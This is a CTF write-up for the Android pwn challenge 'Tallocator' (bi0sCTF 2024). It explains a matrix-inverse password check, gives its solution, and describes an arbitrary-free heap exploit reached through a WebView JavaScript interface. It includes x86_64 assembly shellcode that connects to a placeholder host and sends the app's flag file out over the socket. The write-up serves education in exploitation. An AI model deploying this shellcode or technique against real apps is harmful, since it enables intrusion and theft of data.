---
title: "Tallocator"
event: bi0sCTF 2024
difficulty: hard
points: 995
date: 2024-02-01
tags: ["bi0sctf", "Android", "Reverse_Shell"]
---

I created an Android based pwn challenge that involes exploiting a dynamic memory allocator using the webview interface. 
<!--more-->
 
The challenge inclues the following sections:
+ native.c:
    - Reverse engineering matrix operations performed.
+ tallocator.c: 
    - Exploiting an arbitrary free to corrupt heap metadata.
    - Reverse shellcode to execute an ORW. 


**Challenge Points:** 995
**Solves:** 4

## Challenge Author:
+ [tourpran](https://twitter.com/tourpran): Memory Allocator Exploitation, tallocator.c
+ [the.m3chanic](https://twitter.com/the_m3chanic_): Reverse Engineering, native.c
+ [k0m1](https://x.com/r_srikesh): General Android Dev

## Challenge Description:
Built our enhanced memory allocator, designed specifically for admins and prioritizing both speed and security. Experience the boost in performance firsthand with our website speed tester.

## Challenge File:
+ [Primary Link](https://drive.google.com/file/d/1dImmDf4uCWRpCMYQYLxKMxhBwOwiqh6i/view?usp=sharing)
+ [Mirror Link](https://1drv.ms/u/s!AnRA0IqCqZajjS2Y-qQWoo545mQ6?e=QLNoKa)

## General:

First time, creating an android X pwn challenge, it was pretty fun and straight forward to solve. This challenge was inspired from [google CTF: TRIDROID](https://fineas.github.io/FeDEX/post/tridroid.html). If you are new to this, I heavily recomend going through that first. We will go in this specific order to solve the challenge.
- [Debugging with gdbserver](#Debugging-with-gdberver)
- [Reversing the native.c](#Reversing-the-native-c)
- [Exploiting the tallocator.c](#Exploiting-the-tallocator-c)
- [Writing Reverse Shellcode](#Writing-Reverse-Shellcode)
- [Packing the Exploit](#Exploit-Script-with-comments)

## Introduction: The App: 

- Lets start analyzing the application from `AndroidManifest.xml` by throwing our application into **JADX**. 
- The application has a very simple working with just one activity `MainActivity` and also has Internet Permission. 

> Looking into `MainActivity.java`
```java
    @Override
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.activity_main);
        this.w = (WebView) findViewById(R.id.webView);
        this.b = new BroadcastReceiver() {
            @Override // android.content.BroadcastReceiver
            public void onReceive(Context context, Intent intent) {
                if (Objects.equals(intent.getAction(), MainActivity.INTENT1)) {
                    MainActivity.this.w.loadUrl((String) Objects.requireNonNull(intent.getStringExtra("url")));
                }
            }
        };
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(INTENT1);
        registerReceiver(this.b, intentFilter);
        this.w.getSettings().setJavaScriptEnabled(true);
        this.w.getSettings().setCacheMode(2);
        this.w.addJavascriptInterface(this, "bi0sctf");
        this.w.setWebViewClient(new WebViewClient());
        this.w.setWebChromeClient(new WebChromeClient());
        this.w.loadUrl("http://example.net");
    }
```

- We Could see that this activity has a Webview loading `example.net`. We can load a custom url using the Dynamic Broadcast Receiver which takes an extra `url`. 
- We could notice that a library named `tallocator` is being loaded and it provides 2 native functions - `talloc` and `tree`. 
```java
    public native long talloc(int i, byte[] bArr);
    public native int tree(long j);
```

- Along with that, this webview provides a `JavascriptInterface`, whose methods can be accessed via `bi0sctf` instance. 
```java
@JavascriptInterface
    public long secure_talloc(String str, int i, byte[] bArr) {
        if (new a().check(str)) {
            return talloc(i, bArr);
        }
        return -1L;
    }

    @JavascriptInterface
    public int secure_tree(String str, long j) {
        if (new a().check(str)) {
            return tree(j);
        }
        return -1;
    }
```

- There are 2 functions that has `@JavascriptInterface` notation - `secure_talloc` and `secure_tree`, which internally accesses the native functions **talloc** and **tree** if we bypass the `check` method of class `a`. 

> Looking at class `a`:
```java
public class a {
    public native boolean check(String str);

    static {
        System.loadLibrary("native");
    }
}
```

- It has just one method `check` that is being implemented in a JNI Library named `native`, Which will be covered in the upcoming sections.

## Debugging with gdberver:
- Create the android image with the same specifications as given in the script.py (with AVDManager). 

```py
subprocess.call(
"avdmanager" +
" create avd" +
" --name 'Pixel_4_XL'" +
" --abi 'default/x86_64'" +
" --package 'system-images;android-30;default;x86_64'" +
" --device pixel_4_xl" +
" --force" +
" > /dev/null 2> /dev/null",
env=ENV,close_fds=True,shell=True)
```

- Install the apk into the emulator and run the app. Meanwhile in `adb` get the pid of the app and attach gdbserver to that pid with port forwarding enabled.
- In our machine we just connect gdb to that port using:
```
$ adb forward tcp:7777 tcp:port
$ gdb
$ target remote 127.0.0.1:port
```
- More information on how to work with gdbserver and inpecting memory is given [here](https://fineas.github.io/FeDEX/post/tridroid.html).

## Reversing the native.c:
The working of the.m3chanic's part of the challenge is pretty straightforward. 

Let us start by looking at where our input is involved in this
- First, a floating point array of 4x4 is being initialised, and being passed to a function `v4`

```c
void func_1(float a1[4][4])
{
    for (int i = 0; i < 4; i++)
    {
        for (int j = 0; j < 4; j++)
        {
        char c;
        scanf("%c", &c);
        a1[i][j] = (float)c;
        }
    }
}
```
- This function is simple, it's just taking 16 characters as input and storing them as a 2d floating point matrix
- Next up it's initialising another 4x4 floating point array, and passing it to another function 

> func_7 is as follows
```c
void func_7(float a1[x][x], float a2[x][x])
{
    int i, j;
    for (i = 0; i < x; i++) {
        for (j = 0; j < x; j++) {
            a2[i][j] = a1[i][j];
        }
    }
}
```
- This function is just copying the matrix to `a2`, so now `v2` contains our input 

> Next,
```c
float func_2(int a1, int a2, float a3[a1][a2])
{
    if (a1 != a2) {
        return 0; 
    }

    float v1 = 0;

    if (a1 == 1) {
        v1 = a3[0][0];
    } else {
        for (int i = 0; i < a1; i++) {
            float v2[a1 - 1][a2 - 1];
            for (int j = 1; j < a1; j++) {
                for (int k = 0; k < i; k++) {
                    v2[j - 1][k] = a3[j][k];
                }
                for (int k = i + 1; k < a2; k++) {
                    v2[j - 1][k - 1] = a3[j][k];
                }
            }
            int v3 = (i % 2 == 0) ? 1 : -1;
            v1 += v3 * a3[0][i] * func_2(a1 - 1, a2 - 1, v2);
        }
    }

    return v1;
}
```

- This function is called with arguments (4, 4, input_arr)
- It is declaring another floating point array `v2` (local to this function), of 1 square dimension lesser than our input matrix 

> Let's break down this `for` loop:
```c
for (int j = 1; j < a1; j++) {
    for (int k = 0; k < i; k++) {
        v2[j - 1][k] = a3[j][k];
    }
    for (int k = i + 1; k < a2; k++) {
        v2[j - 1][k - 1] = a3[j][k];
    }
}
```
- Currently, we know that `v2` forms some kind of submatrix of the original matrix that we pass in, and that checks out seeing how it is being populated inside this for loop 
- A float `v1` is being initialised to 0 as well. 
```c
int v3 = (i % 2 == 0) ? 1 : -1;
v1 += v3 * a3[0][i] * func_2(a1 - 1, a2 - 1, v2);
```
- Then, based on the index value of i (as in, whether or not it is divisible by 2), it is set to either 1 or -1
And it is multiplied with the current column value of a3 and then multiplied with the return value of `func_2` but with a smaller sub-matrix

If you see through this abstraction a little bit, and try and look at it as an implementation of something already existing, you will quickly realised that `func_2` is just calculating the determinant of whatever matrix you pass to it
(Some things that give this away are the fact that submatrix is passed on recursively, and -1 is multiplied with the final return value based on the current index, which is the case for determinant also)


> Next up, a new 4x4 matrix is being initialised and being passed to a function along with our input matrix 
```c
void func_3(int a1, float a2[a1][a1], float a3[a1][a1])
{
    float v1[a1 - 1][a1 - 1];

    for (int i = 0; i < a1; i++)
    {
        for (int j = 0; j < a1; j++)
        {
            int sub_i = 0, sub_j = 0;

            for (int v2 = 0; v2 < a1; v2++)
            {
                if (v2 == i)
                    continue;
                for (int v3 = 0; v3 < a1; v3++)
                {
                    if (v3 == j)
                        continue;

                    v1[sub_i][sub_j] = a2[v2][v3];
                    sub_j++;
                }

                sub_i++;
                sub_j = 0;
            }

            int v4 = (i + j) % 2 == 0 ? 1 : -1;
            a3[i][j] = v4 * func_2(a1 - 1, a1 - 1, v1);
        }
    }
}
```
Similar to the previous function, another submatrix is being initialised inside the function and is being populated - again, based on the indices 
This one seems straightforward now that we've understood the previous function 
It is simply calculating the `minor` matrix of the matrix passed as argument to it, and is finding the determinant of *that* matrix. This is the same as finding the *cofactor* of the given matrix (again, looking at it literally might not make sense at first, but once you try and think of it as an implementation of something else, the dots will start connecting).

> Next function 
```c
void func_4(int a1, int a2, float a3[a1][a2], float a4[a2][a1])
{
    for (int i = 0; i < a1; i++)
    {
        for (int j = 0; j < a2; j++)
        {
            a4[j][i] = a3[i][j];
        }
    }
}
```
- This one is simple, it just transposes the matrix you give it as input 
Now, I think you can start seeing the full picture as well 

- First, we found the determinant of the matrix, next we found the cofactor matrix and transposed it (Keep in mind, transpose of the cofactor matrix is the same as finding the *adjoint* of a given matrix)

- Next up, it's taking the adjoint of the matrix we input, and dividing it with the determinant we found of it earlier
```c
void inverse_matrix(int N, float matrix[N][N], float inverse[N][N], int det, float cofactor[N][N])
{

    for (int i = 0; i < N; i++)
    {
        for (int j = 0; j < N; j++)
        {
            inverse[i][j] = (float) (cofactor[j][i] / det);
        }
    }
}
```
- This is the same formula as finding the *inverse* of a given matrix ;)

- And finally, the inverse of our matrix is being compared with a precalculated inverse 
By property, (A⁻¹)⁻¹ == A itself, so all we need to do is find the inverse of the precalculated matrix 

Finding that, and rounding off the numbers appropriately and converting them to their ascii characters will give us this as the valid input: `50133tbd5mrt1769`
And now we can proceed to the rest of the challenge! :)

## Exploiting the tallocator.c:

It is pretty straight forward to reverse engineer the talloc/tree functions that act similar to the malloc/free. So, I will be using my source code to explain things more clearly. Lets start off with a quick code run through...

### Essentials:
```c
int init_talloc(){
    if(init_called == true){
        return 0;
    }

    runDebug = mmap((void*)0x41410000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    init_called = true;
    HeapStart = sbrk(0x1000);

    PUT(HeapStart+8, 0x30);
    PUT(HeapStart+0x38, (0x1000 - 0x38));
    PUT(HeapStart+0x20, 0x3a63);
    top_chunk = HeapStart + 0x38;
}
```

- In `init_talloc`, we can see that the `runDebug` is set to a mmapped region with RWX permisions, which has an addres of `0x41410000`.
- Rest, initializes the Heapstart and topchunk to their appropriate values after an sbrk syscall. 

### talloc:
    
```c
Debugger_talloc = *(long long *)(HeapStart+40);
if(Debugger_talloc != 0){
    void (*call_debugger)() = (void (*)())Debugger_talloc;
    call_debugger();
    perror("Debugger called !!");
}
```
- Quickly checks if the `Debugger_talloc` is set to NULL, otherwise it jumps to whatever it is pointing to. 

```c
if(alloc_size <= 0x150 && (ull *)HEAD_SHORT != 0){
    void* curr_ptr = (void *)HEAD_SHORT;
    int cnt = 0;
    while(curr_ptr != NULL && cnt != 20){

        if(GETSIZE(curr_ptr) >= alloc_size && abs(alloc_size-GETSIZE(curr_ptr)) < best_size){
            best_size = abs(alloc_size - GETSIZE(curr_ptr));
            ptr = (ull*)curr_ptr;
        }
        curr_ptr = (ull *)*(ull *)(curr_ptr);
        cnt += 1;
    }
    if(ptr != 0 && GET_FWD(ptr) != 0){
        SET_BKD(GET_FWD(ptr), GET_BKD(ptr));
    }
    if(ptr != 0 && GET_BKD(ptr) != 0){
        SET_FWD(GET_BKD(ptr), GET_FWD(ptr));
    }
    if((ull)ptr == HEAD_SHORT){
        PUT(&HEAD_SHORT, GET(ptr));
    }
}
```
- Pretty Simple, straight forward use of getting a free chunk.
    - Get the `HEAD_SHORT` from the top of the created heap, iterate through the entire linked_list and keep storing your best fit size and a pointer to that chunk.
    - Finally unlink that particular chunk from the linked list.
- The same process is done if the request for the chunk was above the range 0x150, instead updating from the `HEAD_LONG`.
- If no chunk is present in the linked list, it just takes space from the top_chunk.
- note: `HEAD_LONG` and `HEAD_SHORT` are both stored on top of our entire heap. 

### tree:
```c
if(chunk_size <= 0x100){
    if(HEAD_SHORT == 0){
        SET_FWD(ptr, 0);
        SET_BKD(ptr, &HEAD_SHORT);
        HEAD_SHORT = (ull)ptr;
        return 0;
    }
    SET_FWD(ptr, HEAD_SHORT);
    SET_BKD(ptr, &HEAD_SHORT);

    SET_BKD(HEAD_SHORT, ptr);
    HEAD_SHORT = (ull)ptr;
}
```
- Essentially, adds it back to the linked list, pointed by `HEAD_SHORT` and `HEAD_LONG`.  

### other:
```c
#define SET_USE(p) *(ull *)(p-8) = (*(ull *)(p-8)) | 0b1
#define SET_FREE(p) *(ull *)(p-8) = (*(ull *)(p-8)) & ~(0b1UL)
```
- Every chunk is 16 bytes aligned, hence I made it so that the last bit in the size_field as either:
    - 1: currently in use
    - 0: free to use

### Helper Functions:

```js
function p64(data){ 
    const byteArray = new Uint8Array([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
    let i=0
    while(data > 0){
        byteArray[i] = data&0xff
        data = (data - data%256) / 256
        i = i+1
    }
    return String.fromCharCode.apply(String, byteArray)
}
function fin(data){
    const byte_array = []
    for (const character of data) {
        const code = character.charCodeAt(0)
        byte_array.push(code)
    }
    return byte_array
}
function u64(data){ 
    return parseInt(data.match(/../g).reverse().join(''), 16)
}
```

- Helps converting the 8 byte data stream in little endian to write specific address into memory.

### Bug:

- We are able to free arbitrary pointers eventough it has some basic restrictions. Hence, Forging a fake chunk and using that to access the free list pointers on top of the heap. 
- Manipulating the free_list pointers will get us to arbitrary write and hence writing out shellcode into the RWX region. This was the main aim of the challenge.

## Writing Reverse Shellcode:
- Create a socket.
- Establish a connection to the ip, port that you have a listening port open on.
- Finally do Open, Read, Write, to the opened socket to print out the flag.

```asm
global _start
section .text

_start:
socket:
	push 0x29
	pop rax
	push 0x02
	pop rdi
	push 0x01
	pop rsi
	xor edx, edx
	syscall

	mov r9, rax

connect:
	push 0x2a
	pop rax

	mov rdi, r9

	; creating sockaddr data structure
	push rdx			; pushing padding
	push rdx

	push 0xdeadbeef     ; pushing INADDR_ANY
	push word 0x3905	; pushing PORT: 1337
	push word 0x0002	; pushing AF_INET

	mov rsi, rsp
	add rdx, 0x10
	syscall

open:
	mov rax, 2
	mov r8, 0x0000000000000067
	push r8
	mov r8, 0x616c662f65676e65
	push r8
	mov r8, 0x6c6c6168632e6469
	push r8
	mov r8, 0x6f72646e612e6674
	push r8
	mov r8, 0x63733069622f6174
	push r8
	mov r8, 0x61642f617461642f
	push r8
	mov rdi, rsp
	mov rsi, 0
	mov rdx, 0
	syscall

read:
	mov rdi, rax
	mov rax, 0
	mov rsi, rsp
	mov rdx, 0x50
	syscall

write:
    mov rax, 0x1
    mov rdi, r9
    mov rsi, rsp
    mov rdx, 0x50
    syscall

finish:
	push 0x3c
	pop rax
	syscall

path: db "/data/data/bi0sctf.android.challenge/flag", 0
```

## Exploit Script with comments:

> Receiveing the Flag on the listening port:

![alt text](/images/tallocator/image-3.png)
> Quick Mind Map:

![bob](/images/tallocator/image.png)
- The Final exploit to exploit can be found [here](https://gist.github.com/tourpran/e18490a2d4790befcb2d18e3c18b16ae)

## Closing Note:

Congrats to ``The Flat Network Society`` for first blooding the challenge. Hope you guys had fun solving the challenge!
